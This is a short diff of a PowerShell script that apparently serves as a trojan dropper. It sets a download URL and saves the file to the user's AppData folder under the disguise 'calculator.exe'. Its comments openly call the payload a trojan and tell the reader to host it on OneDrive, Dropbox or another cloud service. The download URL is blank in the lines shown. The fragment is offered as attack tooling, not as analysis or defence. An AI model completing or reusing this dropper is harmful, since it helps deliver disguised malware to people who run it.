@@ -1,6 +1,5 @@
 # Define the URL of the file to download
-$WebFile = " " # This is my trojan.
-
+$WebFile = " " # Add a OneDrive or Dropbox or any other cloud hosting link to your trojan.
 # Define the destination path for the downloaded file
 $destination = "$env:APPDATA\calculator.exe"
 
